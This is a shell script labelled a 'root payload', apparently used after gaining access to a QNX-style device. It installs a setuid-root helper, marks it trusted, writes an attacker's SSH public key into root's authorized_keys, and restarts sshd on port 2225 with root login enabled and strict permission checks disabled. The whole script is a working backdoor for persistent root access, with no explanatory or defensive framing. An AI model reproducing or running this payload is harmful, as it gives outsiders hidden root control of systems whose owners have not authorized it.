#!/bin/sh
# q20 root payload v5: write our pubkey to /root/.ssh/authorized_keys (root-
# owned, StrictModes-clean) and point sshd at it. Port 2225.
PAY=/accounts/devuser/rootdata
{
  echo "== q20 payload v5 running =="

  if [ -f $PAY/__root ]; then
    cp -f $PAY/__root /base/bin/__root 2>/dev/null \
      || pathmgr_symlink $PAY/__root /base/bin/__root 2>/dev/null
    chmod 4755 /base/bin/__root 2>/dev/null
    /proc/boot/pathtrust '!/base/bin/__root' 2>/dev/null
    echo '!/base/bin/__root' > /proc/boot/pathtrust 2>/dev/null
  fi

  mkdir -p /root/.ssh 2>/dev/null
  chmod 700 /root/.ssh 2>/dev/null
  cat > /root/.ssh/authorized_keys <<EOF2
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDOBpa9oTHJo8D4D8AESlyuR3HM9aFoFo087SV7Iq98MeM++aTaEj9Ik/vjBuV6ir+InVcPfwG+GkQ9pW2YaPzsBeKfUzBoSocW4MxcGlW8cQ8zEw1s2+acmRaDeNaBta5GTDS2iyi8+LY/SQtVLzkmeZR1+gWs3/UNVfOzr5t7NOL5WPhLj7qb3n2GZyiXe90czYNtEyeVmnnsyUmpSGtDHlJiR8V5625ASJXlbBymjMR/mFOwuIJRW3ZPqcEFJyQi4gMLF8FuGNysyd+IAK42hhCAcLzKjWh6hQ/WuZLLLUeJ3GUys4T03op3y/DBW89Y3S0xhtyeSu7nqGwVA13yRHzMgJEtfhoEGiTQg8kl1Z2cLLdlkcHuHNTWE5R7EQzhqIdUXdnb3BZVJ/vK8x3D7PWlsJg/Y/lrHY9PTNqIsOW4vdDZxaUKrj9EDGasirFaRI2j1kvmfIfjR9RWAHkVWKzVID0lUN8PelohforXY+UxxRXasVJt4fSIpd6Qnxr8GSB/IRzD65nPcyy0B2xFklvCf7KkJzAEWR7x6ZiQIK+2PhdO7bD7HfCJguTMRzSrPPr/BSZEio0iwVnGI+kw9xZYeo8sHZoDK9fDARoz/iymAq2hmnWb3yT/hYt+2PELGI0NrnONWo6JjykOA9s2N/RnrRREofv3Ni/tB0O9NQ==
EOF2
  chown 0:0 /root/.ssh/authorized_keys 2>/dev/null
  chmod 600 /root/.ssh/authorized_keys 2>/dev/null
  ls -la /root/.ssh/ 2>&1
  md5sum /root/.ssh/authorized_keys 2>/dev/null || true

  slay -f sshd 2>/dev/null
  sleep 1
  /usr/sbin/sshd -p 2225 \
    -o PermitRootLogin=yes -o AllowUsers=root \
    -o AuthorizedKeysFile="/root/.ssh/authorized_keys /accounts/devuser/.ssh/authorized_keys2" \
    -o HostKey=/etc/ssh/ssh_host_rsa_key \
    -o PasswordAuthentication=no -o Protocol=2 -o StrictModes=no
  echo "sshd 2225 rc=$?"
  echo done > /tmp/q20-rooted
  echo "== payload v5 finished =="
} > /tmp/q20-payload.log 2>&1
